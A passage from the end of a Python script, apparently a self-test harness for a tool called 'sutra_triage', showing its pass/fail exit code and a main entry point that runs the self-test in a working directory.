    return 0 if passed == len(results) and reg_passed == len(regressions) and ov_passed == len(overnight) else 1


if __name__ == "__main__":
    _safe_console()
    sys.exit(_self_test(sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.getcwd(), "sutra_triage_selftest")))
